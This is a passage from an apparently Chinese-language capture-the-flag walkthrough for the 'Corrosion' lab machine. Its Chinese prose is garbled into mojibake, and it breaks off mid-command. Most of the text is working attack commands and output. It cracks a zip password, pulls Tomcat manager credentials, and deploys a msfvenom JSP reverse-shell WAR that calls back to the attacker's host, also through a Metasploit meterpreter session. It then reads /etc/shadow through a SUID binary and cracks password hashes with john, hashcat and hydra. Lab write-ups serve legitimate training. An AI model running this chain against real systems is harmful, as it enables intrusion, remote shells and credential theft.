class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">Hey randy! It<span class="hljs-comment">&#x27;s your System Administrator. I left you a file on the server, I&#x27;m sure nobody will find it.</span><br>Also remember <span class="hljs-keyword">to</span> use that password I gave you.<br></code></pre></td></tr></table></figure><p>è®¿é—® <code>http://192.168.135.150:8080/backup.zip</code> ï¼Œä¸‹è½½ä¸‹æ¥ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œæ˜¯é…ç½®ä¿¡æ¯ï¼Œä½†éœ€è¦å¯†ç ï¼Œå¯¹å‹ç¼©åŒ…è¿›è¡Œç ´è§£ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> wget http://192.168.135.150:8080/backup.zip</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> John</span><br><span class="hljs-meta">$</span><span class="bash"> zip2john backup.zip &gt; passwd.txt; john passwd.txt --wordlist=/usr/share/wordlists/rockyou.txt</span><br>[......]<br>@administrator_hi5 (backup.zip)<br>[......]<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> fcrackzip/rarcrack/Python(zipfile)</span><br><span class="hljs-meta">$</span><span class="bash"> fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u backup.zip</span><br></code></pre></td></tr></table></figure><p>è§£å‹æ–‡ä»¶ï¼Œå¯¹æ–‡ä»¶è¿›è¡ŒæŸ¥çœ‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> unzip -P @administrator_hi5 -q backup.zip -d ./backup</span><br></code></pre></td></tr></table></figure><p>åœ¨ <code>tomcat-users.xml</code> ä¸­æ‰¾åˆ°ä¸¤ä¸ªç”¨æˆ·åå’Œå¯†ç ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">tomcat-users</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://tomcat.apache.org/xml&quot;</span></span><br><span class="hljs-tag">              <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">              <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://tomcat.apache.org/xml tomcat-users.xsd&quot;</span></span><br><span class="hljs-tag">              <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">role</span> <span class="hljs-attr">rolename</span>=<span class="hljs-string">&quot;manager-gui&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span> <span class="hljs-attr">username</span>=<span class="hljs-string">&quot;manager&quot;</span> <span class="hljs-attr">password</span>=<span class="hljs-string">&quot;melehifokivai&quot;</span> <span class="hljs-attr">roles</span>=<span class="hljs-string">&quot;manager-gui&quot;</span>/&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">role</span> <span class="hljs-attr">rolename</span>=<span class="hljs-string">&quot;admin-gui&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span> <span class="hljs-attr">username</span>=<span class="hljs-string">&quot;admin&quot;</span> <span class="hljs-attr">password</span>=<span class="hljs-string">&quot;melehifokivai&quot;</span> <span class="hljs-attr">roles</span>=<span class="hljs-string">&quot;admin-gui, manager-gui&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tomcat-users</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="äºŒã€æƒé™è·å–"><a href="#äºŒã€æƒé™è·å–" class="headerlink" title="äºŒã€æƒé™è·å–"></a>äºŒã€æƒé™è·å–</h2><h3 id="M1ã€Upload"><a href="#M1ã€Upload" class="headerlink" title="M1ã€Upload"></a>M1ã€Upload</h3><p>åœ¨ <code>http://192.168.135.150:8080/manager/html</code> ä¸­å‘ç°ä¸€ä¸ªå¯ä»¥ä¸Šä¼  war æ–‡ä»¶çš„åœ°æ–¹ï¼Œå°è¯•ä¸Šä¼ æœ¨é©¬ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.135.141 LPORT=4444 -f war &gt; shell.war</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ admin ä¸Šä¼ å¤±è´¥ï¼š</p><blockquote><p>åæ¥å†æ¬¡ä½¿ç”¨ admin ä¸Šä¼ å±…ç„¶æˆåŠŸäº†ï¼Œä¸çŸ¥é“ä»€ä¹ˆåŸå› </p></blockquote><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs vhdl"><span class="hljs-number">403</span> <span class="hljs-keyword">Access</span> Denied<br>You are <span class="hljs-keyword">not</span> authorized <span class="hljs-keyword">to</span> <span class="hljs-keyword">view</span> this page.<br><br>By <span class="hljs-keyword">default</span> the Manager <span class="hljs-keyword">is</span> only accessible from a browser running <span class="hljs-keyword">on</span> the same machine as Tomcat. <span class="hljs-keyword">If</span> you wish <span class="hljs-keyword">to</span> modify this restriction, you<span class="hljs-symbol">&#x27;ll</span> need <span class="hljs-keyword">to</span> edit the Manager<span class="hljs-symbol">&#x27;s</span> <span class="hljs-keyword">context</span>.xml <span class="hljs-keyword">file</span>.<br><br>[......]<br><br><span class="hljs-keyword">If</span> you have <span class="hljs-keyword">not</span> changed any <span class="hljs-keyword">configuration</span> files, please examine the <span class="hljs-keyword">file</span> conf/tomcat-users.xml <span class="hljs-keyword">in</span> your installation. That <span class="hljs-keyword">file</span> must contain the credentials <span class="hljs-keyword">to</span> let you <span class="hljs-keyword">use</span> this webapp.<br><br><span class="hljs-keyword">For</span> example, <span class="hljs-keyword">to</span> add the manager-gui role <span class="hljs-keyword">to</span> a user named tomcat <span class="hljs-keyword">with</span> a password <span class="hljs-keyword">of</span> s3cret, add the following <span class="hljs-keyword">to</span> the config <span class="hljs-keyword">file</span> listed above.<br><br>&lt;role rolename=<span class="hljs-string">&quot;manager-gui&quot;</span>/&gt;<br>&lt;user username=<span class="hljs-string">&quot;tomcat&quot;</span> password=<span class="hljs-string">&quot;s3cret&quot;</span> roles=<span class="hljs-string">&quot;manager-gui&quot;</span>/&gt;<br><br>[......]<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ manager å°è¯•ï¼ŒæˆåŠŸä¸Šä¼ ï¼Œè®¿é—®å‡ºç° 404 ï¼Œå°†æ–‡ä»¶åå­—ä¿®æ”¹ä¸º wzz.warï¼ŒæˆåŠŸä¸Šä¼ å¹¶è®¿é—® ã€‚</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">HTTP Status <span class="hljs-number">404</span> â€“ <span class="hljs-keyword">Not</span> <span class="hljs-built_in">Found</span><br><span class="hljs-keyword">Type</span> Status Report<br><br>Message JSP file [/ozmptmhkzfd.jsp] <span class="hljs-keyword">not</span> <span class="hljs-built_in">found</span><br><br>Description The origin <span class="hljs-keyword">server</span> did <span class="hljs-keyword">not</span> find a <span class="hljs-keyword">current</span> representation <span class="hljs-keyword">for</span> the target resource <span class="hljs-keyword">or</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> willing <span class="hljs-keyword">to</span> disclose that one <span class="hljs-keyword">exists</span>.<br><br>Apache Tomcat/<span class="hljs-number">9.0</span><span class="hljs-number">.53</span><br></code></pre></td></tr></table></figure><p>ç›‘å¬ï¼Œè®¿é—® <code>http://192.168.135.150:8080/wzz/</code> ï¼ŒæˆåŠŸåå¼¹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 4444</span>            <br>listening on [any] 4444 ...<br>connect to [192.168.135.141] from (UNKNOWN) [192.168.135.150] 52036<br><span class="hljs-meta">$</span><span class="bash"> whoami</span><br>tomcat<br><span class="hljs-meta">$</span><span class="bash"> id</span><br>uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹ <code>/etc/passwd</code> ï¼Œå¾—åˆ°å¦å¤–ä¸¤ä¸ªç”¨æˆ·ï¼š<code>jaye</code> å’Œ <code>randy</code> ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>[......]<br>randy:x:1000:1000:randy,,,:/home/randy:/bin/bash<br>tomcat:x:1001:1001::/home/tomcat:/bin/sh<br>jaye:x:1002:1002::/home/jaye:/bin/sh<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹æ–‡ä»¶ï¼Œå¾—åˆ° flag å’Œæç¤ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ls /home</span><br>jaye<br>randy<br><span class="hljs-meta">$</span><span class="bash"> ls /home/jaye</span><br><span class="hljs-meta">$</span><span class="bash"> ls /home/randy</span><br>Desktop<br>Documents<br>Downloads<br>Music<br>note.txt<br>Pictures<br>Public<br>randombase64.py<br>Templates<br>user.txt<br>Videos<br><span class="hljs-meta">$</span><span class="bash"> cat /home/randy/user.txt</span><br>ca73a018ae6908a7d0ea5d1c269ba4b6<br><span class="hljs-meta">$</span><span class="bash"> cat /home/randy/note.txt</span><br>Hey randy this is your system administrator, hope your having a great day! I just wanted to let you know<br>that I changed your permissions for your home directory. You won&#x27;t be able to remove or add files for now.<br>I will change these permissions later on.<br>See you next Monday randy!<br></code></pre></td></tr></table></figure><h3 id="M2ã€MSF"><a href="#M2ã€MSF" class="headerlink" title="M2ã€MSF"></a>M2ã€MSF</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs shell">msf6 &gt; use exploit/multi/http/tomcat_mgr_upload<br>[*] No payload configured, defaulting to java/meterpreter/reverse_tcp<br>msf6 exploit(multi/http/tomcat_mgr_upload) &gt; show options<br><br>Module options (exploit/multi/http/tomcat_mgr_upload):<br><br>   Name          Current Setting  Required  Description<br>   ----          ---------------  --------  -----------<br>   HttpPassword                   no        The password for the specified username<br>   HttpUsername                   no        The username to authenticate as<br>   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]<br>   RHOSTS                         yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit<br>   RPORT         80               yes       The target port (TCP)<br>   SSL           false            no        Negotiate SSL/TLS for outgoing connections<br>   TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeploy will be used)<br>   VHOST                          no        HTTP server virtual host<br><br><br>Payload options (java/meterpreter/reverse_tcp):<br><br>   Name   Current Setting  Required  Description<br>   ----   ---------------  --------  -----------<br>   LHOST  192.168.135.141  yes       The listen address (an interface may be specified)<br>   LPORT  4444             yes       The listen port<br><br><br>Exploit target:<br><br>   Id  Name<br>   --  ----<br>   0   Java Universal<br><br><br>msf6 exploit(multi/http/tomcat_mgr_upload) &gt; set RHOST 192.168.135.150<br>RHOST =&gt; 192.168.135.150<br>msf6 exploit(multi/http/tomcat_mgr_upload) &gt; set RPORT 8080<br>RPORT =&gt; 8080<br>msf6 exploit(multi/http/tomcat_mgr_upload) &gt; set HttpUsername manager<br>HttpUsername =&gt; manager<br>msf6 exploit(multi/http/tomcat_mgr_upload) &gt; set HttpPassword melehifokivai<br>HttpPassword =&gt; melehifokivai<br>msf6 exploit(multi/http/tomcat_mgr_upload) &gt; run<br><br>[-] Exploit aborted due to failure: not-found: The target server fingerprint &quot;&quot; does not match &quot;(?-mix:Apache.*(Coyote|Tomcat))&quot;, use &#x27;set FingerprintCheck false&#x27; to disable this check.<br>[*] Exploit completed, but no session was created.<br>msf6 exploit(multi/http/tomcat_mgr_upload) &gt; set FingerprintCheck false<br>FingerprintCheck =&gt; false<br>msf6 exploit(multi/http/tomcat_mgr_upload) &gt; run<br><br>[*] Started reverse TCP handler on 192.168.135.141:4444 <br>[*] Retrieving session ID and CSRF token...<br>[*] Uploading and deploying kzjgLzmgvwvJfA8VstCGx538xC...<br>[*] Executing kzjgLzmgvwvJfA8VstCGx538xC...<br>[*] Undeploying kzjgLzmgvwvJfA8VstCGx538xC ...<br>[*] Exploit completed, but no session was created.<br><br>msf6 exploit(multi/http/tomcat_mgr_upload) &gt; run<br><br>[*] Started reverse TCP handler on 192.168.135.141:4444 <br>[*] Retrieving session ID and CSRF token...<br>[*] Uploading and deploying pMSae7Hpx3qAH7v9lPM...<br>[*] Executing pMSae7Hpx3qAH7v9lPM...<br>[*] Undeploying pMSae7Hpx3qAH7v9lPM ...<br>[*] Sending stage (58060 bytes) to 192.168.135.150<br>[*] Meterpreter session 1 opened (192.168.135.141:4444 -&gt; 192.168.135.150:52254) at 2022-07-01 02:11:13 -0400<br><br>meterpreter &gt; shell<br>Process 1 created.<br>Channel 1 created.<br>python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;<br>/bin/sh: 1: python: not found<br>exit<br>meterpreter &gt; cat /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>[......]<br>randy:x:1000:1000:randy,,,:/home/randy:/bin/bash<br>tomcat:x:1001:1001::/home/tomcat:/bin/sh<br>jaye:x:1002:1002::/home/jaye:/bin/sh<br>meterpreter &gt; cat /etc/shadow<br>[-] core_channel_open: Operation failed: 1<br></code></pre></td></tr></table></figure><h2 id="ä¸‰ã€æƒé™æå‡"><a href="#ä¸‰ã€æƒé™æå‡" class="headerlink" title="ä¸‰ã€æƒé™æå‡"></a>ä¸‰ã€æƒé™æå‡</h2><p>ç”¨æ‹¿åˆ°çš„ç”¨æˆ·å’Œå¯†ç è¿›è¡Œæ’åº“ï¼ŒæˆåŠŸæ‹¿åˆ° jaye ç”¨æˆ·æƒé™ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ssh tomcat@192.168.135.150</span><br>tomcat@192.168.135.150&#x27;s password: <br>Permission denied, please try again. <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ssh randy@192.168.135.150</span><br>randy@192.168.135.150&#x27;s password: <br>Permission denied, please try again.<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ssh jaye@192.168.135.150</span><br>jaye@192.168.135.150&#x27;s password: <br>Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.11.0-34-generic x86_64)<br><br> * Documentation:  https://help.ubuntu.com<br> * Management:     https://landscape.canonical.com<br> * Support:        https://ubuntu.com/advantage<br><br>19 updates can be applied immediately.<br>To see these additional updates run: apt list --upgradable<br><br>The list of available updates is more than a week old.<br>To check for new updates run: sudo apt update<br><span class="hljs-meta">$</span><span class="bash"> whoami</span><br>jaye<br><span class="hljs-meta">$</span><span class="bash"> id</span><br>uid=1002(jaye) gid=1002(jaye) groups=1002(jaye)<br><span class="hljs-meta">$</span><span class="bash"> sudo -l</span><br>[sudo] password for jaye: <br>Sorry, user jaye may not run sudo on corrosion.<br><span class="hljs-meta">$</span><span class="bash"> ls /home</span><br>jaye  randy<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">pwd</span></span><br>/home/jaye<br><span class="hljs-meta">$</span><span class="bash"> ls</span> <br>Desktop  Documents  Downloads  Files  Music  Pictures  Public  snap  Templates  Videos<br><span class="hljs-meta">$</span><span class="bash"> ls Files</span><br>look<br><span class="hljs-meta">$</span><span class="bash"> ls -al Files/look</span><br>---s--s--x 1 root root 14728 Sep 17  2021 Files/look<br></code></pre></td></tr></table></figure><p>åœ¨å…¶ <code>Files</code> ç›®å½•ä¸‹æ‰¾åˆ°ä¸€ä¸ª <code>look</code> ï¼Œå¯ä»¥å®ç°è¶Šæƒè®¿é—®ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./Files/look <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-string">&quot;/etc/shadow&quot;</span></span><br>[......]<br>randy:$6$bQ8rY/73PoUA4lFX$i/aKxdkuh5hF8D78k50BZ4eInDWklwQgmmpakv/gsuzTodngjB340R1wXQ8qWhY2cyMwi.61HJ36qXGvFHJGY/:18888:0:99999:7:::<br>tomcat:$6$XD2Bs.tL01.5OT2b$.uXUR3ysfujHGaz1YKj1l9XUOMhHcKDPXYLTexsWbDWqIO9ML40CQZPI04ebbYzVNBFmgv3Mpd3.8znPf<br>jaye:$6$Chqrqtd4U/B1J3gV$YjeAWKM.usyi/JxpfwYA6ybW/szqkiI1kerC4/JJNMpDUYKavQbnZeUh4WL/fB/4vrzX0LvKVWu60dq4SOQZB0:18887:0:99999:7:::<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ./Files/look <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-string">&quot;/root/root.txt&quot;</span></span><br>2fdbf8d4f894292361d6c72c8e833a4b<br></code></pre></td></tr></table></figure><p>å¾—åˆ° randy çš„ç›å€¼ï¼Œä½¿ç”¨ john è¿›è¡Œçˆ†ç ´ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;randy:$6$bQ8rY/73PoUA4lFX$i/aKxdkuh5hF8D78k50BZ4eInDWklwQgmmpakv/gsuzTodngjB340R1wXQ8qWhY2cyMwi.61HJ36qXGvFHJGY/:18888:0:99999:7:::&#x27;</span> &gt; passwd.txt</span><br>                                                                                                           <br><span class="hljs-meta">$</span><span class="bash"> cat passwd.txt</span>                                             <br>randy:$6$bQ8rY/73PoUA4lFX$i/aKxdkuh5hF8D78k50BZ4eInDWklwQgmmpakv/gsuzTodngjB340R1wXQ8qWhY2cyMwi.61HJ36qXGvFHJGY/:18888:0:99999:7:::<br>                                                                                                           <br><span class="hljs-meta">$</span><span class="bash"> john --wordlist=/usr/share/wordlists/rockyou.txt passwd.txt</span><br>Using default input encoding: UTF-8<br>Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])<br>Cost 1 (iteration count) is 5000 for all loaded hashes<br>Will run 4 OpenMP threads<br>Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status<br>07051986randy    (randy)<br>1g 0:02:22:45 DONE (2022-07-01 03:45) 0.000116g/s 1626p/s 1626c/s 1626C/s 070552898..070511513<br>Use the &quot;--show&quot; option to display all of the cracked passwords reliably<br>Session completed<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> hashcat -m 1800 -a 0 -o found.txt passwd.txt /usr/share/wordlists/rockyou.txt</span>  <br>Session..........: hashcat<br>Status...........: Cracked<br>Hash.Name........: sha512crypt $6$, SHA512 (Unix)<br>Hash.Target......: $6$bQ8rY/73PoUA4lFX$i/aKxdkuh5hF8D78k50BZ4eInDWklwQ...FHJGY/<br>Time.Started.....: Fri Jul  1 08:53:00 2022 (13 hours, 26 mins)<br>Time.Estimated...: Fri Jul  1 22:19:44 2022 (0 secs)<br>Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)<br>Guess.Queue......: 1/1 (100.00%)<br>Speed.#1.........:      905 H/s (17.38ms) @ Accel:32 Loops:512 Thr:1 Vec:4<br>Recovered........: 1/1 (100.00%) Digests<br>Progress.........: 13932928/14344385 (97.13%)<br>Rejected.........: 0/13932928 (0.00%)<br>Restore.Point....: 13932800/14344385 (97.13%)<br>Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4608-5000<br>Candidates.#1....: 070541 -&gt; 070519851<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> cat found.txt</span><br><span class="hljs-meta">$</span><span class="bash">6<span class="hljs-variable">$bQ8rY</span>/73PoUA4lFX<span class="hljs-variable">$i</span>/aKxdkuh5hF8D78k50BZ4eInDWklwQgmmpakv/gsuzTodngjB340R1wXQ8qWhY2cyMwi.61HJ36qXGvFHJGY/:07051986randy</span><br></code></pre></td></tr></table></figure><p>æˆ–è€…ç›´æ¥ä½¿ç”¨ hydra è¿›è¡Œ SSH çˆ†ç ´ ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> hydra -l randy -P /usr/share/wordlists/rockyou.txt 192.168.135.150 ssh</span>  <br></code></pre></td></tr></table></figure><h3 id="M1ã€Sudo"><a href="#M1ã€Sudo" class="headerlink" title="M1ã€Sudo"></a>M1ã€Sudo</h3><p>ä½¿ç”¨ SSH ç™»å½•ï¼ŒæŸ¥çœ‹æƒé™ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ssh randy@192.168.135.150</span> <br>randy@192.168.135.150&#x27;s password: <br><br>randy@corrosion:~$ whoami<br>randy<br>randy@corrosion:~$ id<br>uid=1000(randy) gid=1000(randy) groups=1000(randy),27(sudo)<br>randy@corrosion:~$ sudo -l<br>[sudo] password for randy: <br>Matching Defaults entries for randy on corrosion:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User randy may run the following commands on corrosion:<br>    (root) PASSWD: /usr/bin/python3.8 /home/randy/randombase64.py<br></code></pre></td></tr></table></figure><p>å¯ä»¥è¿è¡Œä¸€ä¸ªæ–‡ä»¶ï¼ŒæŸ¥çœ‹è¯¥æ–‡ä»¶æƒé™ï¼Œå‘ç°ä¸èƒ½æ›´æ”¹è¯¥æ–‡ä»¶ï¼ŒæŸ¥çœ‹å…¶å†…å®¹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">randy@corrosion:~$ pwd<br>/home/randy<br>randy@corrosion:~$ ls -l /home/randy/randombase64.py<br>-rwxr-xr-x 1 root root 210 Sep 20  2021 /home/randy/randombase64.py<br>randy@corrosion:~$ cat /home/randy/randombase64.py<br>import base64<br><br>message = input(&quot;Enter your string: &quot;)<br>message_bytes = message.encode(&#x27;ascii&#x27;)<br>base64_bytes = base64.b64encode(message_bytes)<br>base64_message = base64_bytes.decode(&#x27;ascii&#x27;)<br><br>print(base64_message)<br></code></pre></td></tr></table></figure><p>ç”¨äº† base64 æ¨¡å—ï¼Œæ‰¾åˆ° base64 è„šæœ¬ï¼ŒæŸ¥çœ‹è¯¥æ–‡ä»¶æƒé™ï¼Œå‘ç°å¯ä»¥ä¿®æ”¹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">randy@corrosion:~$ find / -name base64.py  